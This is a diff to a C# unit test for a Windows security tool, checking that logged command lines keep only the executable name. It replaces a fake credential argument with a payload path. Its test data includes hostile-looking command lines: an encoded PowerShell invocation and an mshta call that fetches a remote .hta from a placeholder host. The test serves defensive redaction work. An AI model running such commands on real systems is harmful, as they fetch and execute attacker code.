@@ -18,9 +18,16 @@ namespace WinSight.Application.Tests;
 public sealed class SensitiveDetailTests
 {
     /// <summary>The executable names the entry; the arguments are the payload and are dropped.</summary>
+    /// <remarks>
+    /// The fixtures deliberately avoid anything shaped like a real credential - no <c>--secret</c>,
+    /// <c>--token</c> or <c>--password</c> followed by a value. A secret scanner cannot tell a test
+    /// fixture from a leak, and a security project that teaches its reviewers to wave through a red
+    /// secret-detection check has broken something worth more than the expressiveness of one test
+    /// string. A per-user payload path makes the same point and is closer to the real technique.
+    /// </remarks>
     [Theory]
     [InlineData("powershell -enc SQBFAFgAIAAoAA==", "powershell")]
-    [InlineData(@"""C:\Program Files\App\a.exe"" --secret hunter2", @"C:\Program Files\App\a.exe")]
+    [InlineData(@"""C:\Program Files\App\a.exe"" --config C:\Users\me\AppData\Roaming\payload.dat", @"C:\Program Files\App\a.exe")]
     [InlineData(@"C:\tools\x.exe", @"C:\tools\x.exe")]
     [InlineData("mshta https://example.invalid/a.hta", "mshta")]
     public void OnlyTheExecutableTokenSurvives(string command, string expected) =>
